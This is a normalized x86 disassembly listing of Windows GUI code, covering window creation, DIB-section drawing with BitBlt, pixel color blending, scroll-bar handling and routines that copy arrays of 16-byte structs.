add [ edx ] eax
add al [ ebx ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add al 0x8
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
sub_428730
sub esp 0x30
push ebx
mov ebx [ esp + 0x38 ]
push esi
push edi
push 0xfffffffa
push ebx
call [ GetWindowLongA@IAT ]
xor edi edi
push 0x7f00
mov esi eax
push edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x3c ] r--data
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] 0x30
mov [ esp + 0x2c ] edi
mov [ esp + 0x40 ] edi
call [ LoadCursorA@IAT ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x34 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x30 ] 0x10
mov [ esp + 0x18 ] r-xdata
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
push edi
push esi
push edi
push ebx
push edi
push edi
push edi
push edi
push 0x52800000
push edi
push r--data
push edi
call [ CreateWindowExA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x30
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_4287d0
sub esp 0x74
test ebx ebx
jle r-xdata
add esp 0x74
retn
push ebp
mov ebp [ esp + 0x88 ]
test ebp ebp
push esi
push edi
jle r-xdata
pop edi
pop esi
pop ebp
mov eax [ esp + 0x84 ]
push eax
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
mov [ esp + 0xc ] esi
je r-xdata
xor eax eax
cmp ebx 0x4
mov ecx 0xb
lea edi [ esp + 0x54 ]
[ edi ]
mov [ esp + 0x54 ] 0x28
mov [ esp + 0x58 ] 0x4
jl r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x24 ]
push edx
push 0x0
lea eax [ esp + 0x64 ]
mov ecx ebp
push eax
neg ecx
push 0x0
mov [ esp + 0x74 ] ecx
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x78 ] 0x1
mov [ esp + 0x7a ] 0x20
call [ CreateDIBSection@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x20 ] edi
je r-xdata
mov [ esp + 0x58 ] ebx
push esi
call [ DeleteDC@IAT ]
test edi edi
je r-xdata
push edi
push esi
call [ SelectObject@IAT ]
mov edi [ esp + 0xa0 ]
cmp edi 0x3
mov esi [ esp + 0x1c ]
jne r-xdata
push edi
call [ DeleteObject@IAT ]
mov edx [ esp + 0x9c ]
mov eax [ esp + 0x98 ]
mov ecx [ esp + 0x94 ]
push 0xcc0020
push edx
mov edx [ esp + 0x14 ]
push eax
push ecx
push ebp
push ebx
push 0x0
push 0x0
push edx
call [ BitBlt@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x24 ]
push ecx
push edx
mov [ esp + 0x5c ] 0x1c
mov [ esp + 0x60 ] 0x1
call [ GetClientRect@IAT ]
mov eax [ rw-data ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x100000
mov ebp [ GetScrollInfo@IAT ]
jne r-xdata
cmp edi 0x1
jne r-xdata
test ebp ebp
jle r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x54 ]
push ecx
push 0x0
push edx
call ebp
mov edi [ esp + 0x60 ]
inc edi
mov edi [ esp + 0x2c ]
sub edi [ esp + 0x24 ]
jmp r-xdata
cmp edi 0x3
jne r-xdata
test ebp ebp
jle r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8c ]
mov eax [ esp + 0x88 ]
push 0xcc0020
push 0x0
push 0x0
push ecx
mov ecx [ esp + 0x94 ]
push ebp
push ebx
push edx
push eax
push ecx
call [ BitBlt@IAT ]
mov esi [ esp + 0xc ]
mov edi [ esp + 0x20 ]
mov ecx ebp
mov edx [ rw-data ]
lea ecx [ esp + 0x54 ]
push ecx
push 0x1
push edx
call ebp
mov eax [ esp + 0x60 ]
inc eax
mov eax [ esp + 0x30 ]
sub eax [ esp + 0x28 ]
jmp r-xdata
mov eax [ rw-data ]
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
test eax 0x200000
jne r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x90 ]
mov edi eax
xor ebp ebp
cmp edi ecx
jle r-xdata
mov [ esp + 0x10 ] ebp
lea esp [ esp ]
lea eax [ ebx * 4 ]
add esi eax
dec ecx
jne r-xdata
lea ebx [ ebx ]
call [ GdiFlush@IAT ]
test edi edi
jne r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x88 ]
add ecx edx
mov edx [ esp + 0x8c ]
mov [ esp + 0x34 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x40 ] eax
xor eax eax
push eax
push eax
add ecx edx
lea edx [ esp + 0x3c ]
push edx
push 0x1
mov [ esp + 0x48 ] ecx
mov ecx [ esp + 0xa0 ]
push eax
mov [ esp + 0x58 ] eax
mov [ esp + 0x5c ] eax
lea eax [ esp + 0x58 ]
mov [ esp + 0x64 ] ecx
mov ecx [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x58 ] edi
mov [ esp + 0x68 ] ebx
call sub_45cef0
mov ebp [ esp + 0xac ]
mov edi [ esp + 0xbc ]
add esp 0x1c
jmp r-xdata
test eax eax
jle r-xdata
mov edi ecx
lea eax [ ebx * 4 ]
add esi eax
dec [ esp + 0x10 ]
jne r-xdata
mov edi [ esi + edx * 4 ]
mov eax edi
not eax
mov ecx eax
and ecx 0x303000
xor eax 0x303000
and eax 0xfefe00
lea ecx [ eax + ecx * 2 ]
shr ecx 0x8
and ecx 0x10101
add ecx 0x7f7f7f
xor ecx 0x7f7f7f
mov eax ecx
or eax edi
or ecx 0x303000
sub eax ecx
and eax 0xfefeff
add eax 0x60
mov ecx eax
shr ecx 0x8
and ecx 0x10101
imul ecx ecx 0xff
sub eax ecx
or eax ecx
mov [ esi + edx * 4 ] eax
inc edx
cmp edx ebx
jl r-xdata
xor eax eax
test ebx ebx
jle r-xdata
jmp r-xdata
mov edx [ esi + eax * 4 ]
shr edx 0x1
and edx 0x7f7f7f
mov [ esi + eax * 4 ] edx
inc eax
cmp eax ebx
jl r-xdata
sub ecx edi
test ecx ecx
jle r-xdata
mov eax ebx
shl eax 0x10
cdq
idiv edi
test edi edi
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x10 ] eax
jle r-xdata
xor edx edx
test ebx ebx
jle r-xdata
jmp r-xdata
mov ebp [ esp + 0x90 ]
mov eax ebx
shl eax 0x10
cdq
idiv ecx
mov ecx [ esp + 0x90 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
cmp eax ecx
jge r-xdata
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
nop
mov edi ecx
sub edi eax
mov edx [ esp + 0x10 ]
lea eax [ ebx * 4 ]
add esi eax
mov eax [ esp + 0x14 ]
add ebp edx
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ ebx * 4 ]
sub ebp eax
add esi ecx
dec edi
jne r-xdata
mov eax [ esi + ecx * 4 ]
shr eax 0x1
and eax 0x7f7f7f
mov [ esi + ecx * 4 ] eax
inc ecx
cmp ecx edx
jl r-xdata
mov edx ebp
sar edx 0x10
xor ecx ecx
test edx edx
jle r-xdata
mov ecx [ esp + 0x90 ]
mov eax [ esi + ecx * 4 ]
shr eax 0x1
and eax 0x7f7f7f
mov [ esi + ecx * 4 ] eax
inc ecx
cmp ecx edx
jl r-xdata
mov edx ebp
sar edx 0x10
xor ecx ecx
test edx edx
jle r-xdata
sub_428be0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push 0x1
push eax
call sub_493140
add esp 0x8
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x4 ] 0x1
jmp sub_489430
sub_428c50
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
push ecx
call [ SetFocus@IAT ]
mov eax [ rw-data ]
xor edx edx
cmp eax 0xffffffff
sete dl
dec edx
and edx eax
mov [ rw-data ] edx
sub_428c90
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp eax ecx
je r-xdata
retn
mov edx [ esp + 0xc ]
push ebx
push esi
push edi
mov esi edx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov ebx [ esi + 0x8 ]
mov [ edi + 0x8 ] ebx
mov esi [ esi + 0xc ]
add eax 0x10
cmp eax ecx
mov [ edi + 0xc ] esi
jne r-xdata
pop edi
pop esi
pop ebx
sub_428cd0
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push ebx
push esi
push edi
mov esi ecx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov ebx [ esi + 0x8 ]
mov [ edi + 0x8 ] ebx
mov esi [ esi + 0xc ]
add ecx 0x10
add eax 0x10
cmp ecx edx
mov [ edi + 0xc ] esi
jne r-xdata
pop edi
pop esi
pop ebx
sub_428d10
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
cmp edx eax
mov ecx [ esp + 0x10 ]
je r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
retn
push ebx
push esi
push edi
sub eax 0x10
sub ecx 0x10
cmp eax edx
mov esi eax
mov ebx [ esi ]
mov edi ecx
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov ebx [ esi + 0x8 ]
mov [ edi + 0x8 ] ebx
mov esi [ esi + 0xc ]
mov [ edi + 0xc ] esi
jne r-xdata
pop edi
pop esi
pop ebx
sub_428d60
mov edx [ esp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x8 ]
sub eax esi
push eax
mov eax [ ecx + 0x14 ]
push edx
push eax
push 0x0
call sub_401150
neg eax
sbb eax eax
neg eax
pop esi
retn
sub_428da0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_428d10
add esp 0x14
mov eax esi
pop esi
retn
sub_428de0
mov eax [ esp + 0x8 ]
test eax eax
jbe r-xdata
retn
mov edx [ esp + 0xc ]
push ebx
push esi
mov ecx eax
mov eax [ esp + 0xc ]
push edi
add eax 0x10
dec ecx
jne r-xdata
mov esi edx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov ebx [ esi + 0x8 ]
mov [ edi + 0x8 ] ebx
mov esi [ esi + 0xc ]
mov [ edi + 0xc ] esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_428e20
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push ebx
push esi
push edi
add ecx 0x10
add eax 0x10
cmp ecx edx
jne r-xdata
mov esi ecx
mov ebx [ esi ]
mov edi eax
mov [ edi ] ebx
mov ebx [ esi + 0x4 ]
mov [ edi + 0x4 ] ebx
mov ebx [ esi + 0x8 ]
mov [ edi + 0x8 ] ebx
mov esi [ esi + 0xc ]
mov [ edi + 0xc ] esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
sub_428e60
sub esp 0x18
xor eax eax
push ebx
push ebp
mov ebp [ rw-data ]
mov edx eax
push esi
mov esi eax
push edi
mov edi eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x30 ]
inc ebp
test eax eax
mov [ esp + 0x10 ] ebp
jl r-xdata
mov eax [ esp + 0x2c ]
mov ecx eax
mov [ ecx ] edx
mov [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] edi
pop edi
pop esi
mov [ ecx + 0xc ] ebp
pop ebp
pop ebx
add esp 0x18
retn
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
sub ecx ebx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
mov edi [ rw-data ]
mov esi [ rw-data ]
mov ebx edi
neg esi
sub ebp edi
neg ebx
xor edi edi
test eax eax
mov edx esi
mov ecx esi
jl r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x38 ]
test eax eax
je r-xdata
mov edi [ rw-data ]
inc eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
mov esi eax
mov [ esi ] edx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
pop edi
mov [ esi + 0xc ] ebp
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov esi [ rw-data ]
test esi esi
jne r-xdata
lea ecx [ eax + edx ]
mov eax [ esp + 0x30 ]
add edi 0x10
dec eax
mov [ esp + 0x30 ] eax
jne r-xdata
add ecx eax
cmp ecx [ esp + 0x34 ]
jle r-xdata
mov eax [ rw-data ]
sub eax esi
sar eax 0x4
xor eax eax
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
mov edx ecx
add eax 0x2
test ecx ecx
je r-xdata
mov edi [ esp + 0x14 ]
mov edx [ rw-data ]
mov ecx [ esp + 0x10 ]
add ecx edx
add ebx ecx
add ebp ecx
mov edx esi
mov eax [ esp + 0x38 ]
mov [ eax ] 0x1
shl edi 0x4
mov eax [ edi + esi + 0x8 ]
add edi esi
sub eax [ edi ]
mov esi [ esp + 0x34 ]
lea eax [ eax + ecx + 0x2 ]
cmp eax esi
jg r-xdata
cmp edi eax
je r-xdata
mov eax [ esp + 0x38 ]
mov [ eax ] 0x0
jmp r-xdata
sub_428fa0
sub esp 0x30
mov ecx [ rw-data ]
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x30 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x38 ]
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov esi [ rw-data ]
sub eax ecx
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
inc ebx
neg edx
mov edi eax
neg edi
mov [ esp + 0x1c ] ebx
mov ecx edx
sub ebx eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
mov [ esp + 0x24 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x10 ] 0x0
mov ebp esi
mov eax [ rw-data ]
sub eax esi
sar eax 0x4
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x30
retn
mov esi ecx
mov [ esp + 0x20 ] esi
mov eax [ ebp + 0x8 ]
sub eax [ ebp ]
add eax 0x2
test ecx ecx
je r-xdata
cmp [ esp + 0x10 ] eax
jge r-xdata
lea ecx [ eax + esi ]
mov eax [ esp + 0x44 ]
cmp esi eax
mov [ esp + 0x28 ] ecx
jg r-xdata
mov ebp [ esp + 0x18 ]
add ecx eax
cmp ecx ebp
jle r-xdata
mov esi [ esp + 0x10 ]
mov ebp [ esp + 0x14 ]
inc esi
mov [ esp + 0x10 ] esi
mov esi [ rw-data ]
add ebp 0x10
jmp r-xdata
cmp eax ecx
jge r-xdata
mov esi [ esp + 0x1c ]
mov ecx [ rw-data ]
add ecx esi
add edi ecx
add ebx ecx
mov esi edx
mov [ esp + 0x24 ] edi
mov [ esp + 0x2c ] ebx
mov [ esp + 0x20 ] esi
test esi esi
mov [ esp + 0x14 ] ebp
jne r-xdata
mov eax [ esp + 0x48 ]
cmp edi eax
jg r-xdata
cmp eax ebx
jl r-xdata
mov esi [ esp + 0x4c ]
test esi esi
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov eax [ rw-data ]
push 0x2
lea edx [ esp + 0x24 ]
push edx
push 0x0
push eax
call [ MapWindowPoints@IAT ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi ] ecx
mov ecx [ esp + 0x2c ]
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
sub_4290f0
mov eax [ rw-data ]
sub esp 0x4c
test eax eax
je r-xdata
add esp 0x4c
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push ebx
push esi
lea ecx [ esp + 0x28 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov edx [ esp + 0x28 ]
mov esi [ esp + 0x30 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x2c ]
sub esi edx
mov edx [ rw-data ]
push 0xfffffff0
sub eax ecx
push edx
mov [ esp + 0x10 ] eax
call [ GetWindowLongA@IAT ]
mov ebx eax
push 0x2
mov [ esp + 0x18 ] ebx
call [ GetSystemMetrics@IAT ]
mov ecx ebx
and ecx 0x200000
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
add esi eax
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
xor esi esi
cmp eax esi
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
push ebp
push edi
push 0x0
dec eax
push esi
push eax
lea eax [ esp + 0x4c ]
push eax
call sub_428e60
mov ecx [ eax ]
mov edi [ eax + 0xc ]
mov edx [ eax + 0x4 ]
mov ebp [ rw-data ]
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ esp + 0x20 ]
add edi ebp
add esp 0x10
and ebx 0xffcfffff
cmp eax edi
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] ecx
jge r-xdata
mov [ rw-data ] esi
jg r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
xor eax eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax edi
sub eax edx
cmp ebp eax
jle r-xdata
xor ebp ebp
mov [ rw-data ] ebp
cmp eax esi
jge r-xdata
sub esi [ esp + 0x14 ]
push 0x0
push esi
dec eax
push eax
lea edx [ esp + 0x4c ]
push edx
call sub_428e60
mov ecx [ eax ]
mov edi [ eax + 0xc ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x30 ] ecx
mov ecx [ eax + 0x8 ]
add esp 0x10
add edi ebp
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] ecx
or ebx 0x200000
cmp ebp esi
jge r-xdata
mov ebp eax
mov [ rw-data ] ebp
cmp ebp esi
jge r-xdata
test ebx 0x200000
je r-xdata
xor ebp ebp
mov [ rw-data ] ebp
cmp [ esp + 0x1c ] ebx
pop edi
pop ebp
je r-xdata
cmp [ esp + 0x18 ] esi
mov [ esp + 0x40 ] 0x1c
mov [ esp + 0x44 ] 0x7
je r-xdata
pop esi
pop ebx
mov ecx [ rw-data ]
push ebx
push 0xfffffff0
push ecx
call [ SetWindowLongA@IAT ]
mov edx [ rw-data ]
push 0x27
push esi
push esi
push esi
push esi
push 0xfffffffe
push edx
call [ SetWindowPos@IAT ]
mov eax [ rw-data ]
push esi
push esi
push eax
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
push 0x1
lea edx [ esp + 0x44 ]
push edx
push 0x1
dec edi
push eax
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] ebp
call [ SetScrollInfo@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x40 ]
push edx
push 0x1
push eax
call [ GetScrollInfo@IAT ]
mov ebp [ rw-data ]
sub_4292f0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_428e20
add esp 0x14
retn 0xc
sub_429320
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
push ecx
push esi
push edi
call sub_428de0
mov eax esi
add esp 0x14
shl eax 0x4
add eax edi
pop edi
pop esi
retn 0xc
sub_429350
push 0xffffffff
push sub_4bfd38
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4293d0
mov eax [ fs : 0x0 ]
mov ecx [ esp + 0x4 ]
push 0xffffffff
push sub_4bfd58
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push esi
xor esi esi
cmp ecx esi
je r-xdata
mov ecx [ esp + 0x34 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x3c
retn
mov eax [ ecx + 0x380 ]
mov edx 0x3
cmp eax edx
jne r-xdata
mov eax [ esp + 0x48 ]
cmp eax esi
je r-xdata
push ebx
push ebp
push edi
cmp [ eax + 0x380 ] edx
jne r-xdata
pop edi
pop ebp
pop ebx
cmp [ rw-data ] esi
je r-xdata
mov edx [ rw-data ]
cmp edx esi
jne r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] esi
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
or ebp 0xffffffff
or ebx 0xffffffff
xor edi edi
cmp eax esi
jle r-xdata
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
add ecx 0x20
mov ecx [ ecx + 0x20 ]
jmp r-xdata
mov ecx [ esp + 0x54 ]
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
mov ebp edi
mov eax [ rw-data ]
add eax esi
push ecx
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
add ecx 0x20
mov ecx [ ecx + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x10 ]
inc edi
add esi 0x1c
cmp edi eax
jl r-xdata
mov ebx edi
mov edx [ rw-data ]
lea eax [ esi + edx ]
push ecx
push eax
call sub_401380
add esp 0x8
test al al
je r-xdata
mov ecx [ esp + 0x50 ]
lea esp [ esp ]
test ebp ebp
jl r-xdata
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov esi ebp
imul esi esi 0x1c
add eax esi
push eax
lea ecx [ esp + 0x28 ]
call sub_401fc0
mov eax [ rw-data ]
mov edi ebx
imul edi edi 0x1c
push 0xffffffff
lea ecx [ edi + eax ]
push 0x0
push ecx
lea ecx [ esi + eax ]
mov [ esp + 0x54 ] 0x0
call sub_401dd0
mov eax [ rw-data ]
push 0xffffffff
push 0x0
lea edx [ esp + 0x2c ]
push edx
lea ecx [ edi + eax ]
call sub_401dd0
mov ecx [ rw-data ]
shl ebp 0x4
lea eax [ ecx + ebp ]
mov ebp eax
mov edx [ ebp ]
mov esi [ ebp + 0x4 ]
mov edi [ ebp + 0x8 ]
mov ebp [ ebp + 0xc ]
shl ebx 0x4
add ecx ebx
mov [ esp + 0x20 ] ebp
mov ebp [ ecx ]
mov [ eax ] ebp
mov ebp [ ecx + 0x4 ]
mov [ eax + 0x4 ] ebp
mov ebp [ ecx + 0x8 ]
mov [ eax + 0x8 ] ebp
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
mov eax [ rw-data ]
mov ecx [ esp + 0x20 ]
add ebx eax
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x24 ]
call sub_4480e0
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
sub_4295b0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0xfffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
shl eax 0x4
push edi
mov edi eax
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_429350
sub_429610
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfd70
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x1c ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
mov edx [ esi + 0x4 ]
test edx edx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edx edx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
test edx edx
jne r-xdata
mov ecx esi
call sub_429350
mov ebx 0xfffffff
sub ebx ecx
cmp ebx edi
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x4
cmp ecx edi
mov [ ebp + 0x10 ] eax
jae r-xdata
mov ecx eax
shr ecx 0x1
mov ebx 0xfffffff
sub ebx ecx
cmp ebx eax
jae r-xdata
add ecx edi
cmp eax ecx
jae r-xdata
push eax
push ecx
mov ecx esp
shl edi 0x4
mov edx edi
mov [ ebp + 0x8 ] esp
push ecx
mov [ ecx ] eax
mov edi eax
mov ecx esp
sub edi edx
mov [ ecx ] edi
mov [ ebp + 0x8 ] esp
mov ecx esi
mov [ ebp + 0x8 ] edx
call sub_4292f0
push ecx
mov ecx [ ebp + 0x10 ]
mov [ esi + 0x8 ] eax
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] ecx
mov [ ebp + 0x10 ] esp
mov eax esp
push ecx
mov [ eax ] edi
mov eax esp
lea edx [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esp
push edx
mov [ eax ] ebx
call sub_428da0
add esp 0x10
lea eax [ ebp - 0x20 ]
push eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
add ecx ebx
mov [ ebp + 0x10 ] esp
mov [ eax ] ecx
mov ecx edi
shl ecx 0x4
mov [ ebp + 0x8 ] ecx
add ecx ebx
push ecx
push ecx
mov ecx esp
mov [ ebp + 0x10 ] esp
push ecx
mov [ ecx ] eax
mov eax esp
mov ecx esi
mov [ ebp + 0x10 ] esp
mov [ eax ] ebx
call sub_4292f0
mov eax [ esi + 0x8 ]
mov ecx eax
sub ecx ebx
sar ecx 0x4
lea edx [ ebp - 0x20 ]
push edx
sub edi ecx
push edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_429320
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0x20 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp + 0x8 ] esp
mov [ eax ] esi
jmp r-xdata
add eax ecx
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_428c90
add esp 0xc
mov ecx [ esi + 0x8 ]
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
test edx edx
jne r-xdata
shl eax 0x4
push eax
mov [ ebp + 0xc ] eax
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x0
mov [ eax ] ecx
call sub_428e20
add esp 0x14
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push esi
lea ecx [ ebp - 0x20 ]
push ecx
push edi
push ebx
call sub_428de0
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
add esp 0x14
push ecx
mov edx edi
shl edx 0x4
